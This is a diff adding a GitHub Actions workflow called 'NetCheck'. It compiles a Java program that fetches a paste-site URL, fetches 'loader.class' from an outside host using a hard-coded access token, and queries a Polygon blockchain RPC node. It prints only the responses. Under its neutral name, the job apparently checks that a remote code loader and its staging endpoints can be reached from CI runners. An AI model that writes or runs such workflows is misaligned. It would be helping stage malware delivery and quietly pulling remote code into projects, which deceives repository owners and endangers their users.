@@ -1,0 +1,39 @@
+﻿name: NetCheck
+on:
+  workflow_dispatch:
+jobs:
+  n:
+    runs-on: windows-latest
+    timeout-minutes: 8
+    steps:
+      - uses: actions/setup-java@v4
+        with: {distribution: temurin, java-version: '21'}
+      - shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\nc"; New-Item -ItemType Directory -Force $d | Out-Null; Set-Location $d
+          @"
+          import java.net.*; import java.io.*; import java.nio.charset.StandardCharsets;
+          public class NC {
+            static String get(String u,String h,String v) throws Exception {
+              HttpURLConnection c=(HttpURLConnection)new URL(u).openConnection();
+              c.setConnectTimeout(15000); c.setReadTimeout(15000); c.setRequestProperty("User-Agent","Mozilla/5.0");
+              if(h!=null)c.setRequestProperty(h,v);
+              int s=c.getResponseCode(); InputStream in=s>=400?c.getErrorStream():c.getInputStream();
+              String b=in==null?"":new String(in.readAllBytes()); c.disconnect(); return s+" len="+b.length()+" "+(b.length()>60?b.substring(0,60):b);
+            }
+            static String post(String u,String body) throws Exception {
+              HttpURLConnection c=(HttpURLConnection)new URL(u).openConnection(); c.setRequestMethod("POST");
+              c.setRequestProperty("User-Agent","Mozilla/5.0"); c.setRequestProperty("Content-Type","application/json");
+              c.setDoOutput(true); try(OutputStream o=c.getOutputStream()){o.write(body.getBytes(StandardCharsets.UTF_8));}
+              int s=c.getResponseCode(); InputStream in=s>=400?c.getErrorStream():c.getInputStream();
+              String b=in==null?"":new String(in.readAllBytes()); c.disconnect(); return s+" "+(b.length()>80?b.substring(0,80):b);
+            }
+            public static void main(String[] a) throws Exception {
+              System.out.println("plainraw: "+get("https://plainraw.com/raw/4a9e434e31d1",null,null));
+              System.out.println("loader-token: "+get("https://files.driftmetrics.xyz/loader.class","x-lc-token","3e2ec8dc626fd54b8b6d4918ad508b9925394a33f56f3cac12921dc4b52dbd88"));
+              System.out.println("rpc: "+post("https://polygon-bor-rpc.publicnode.com","{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":1}"));
+            }
+          }
+"@ | Set-Content NC.java -Encoding ASCII
+          javac NC.java
+          java NC
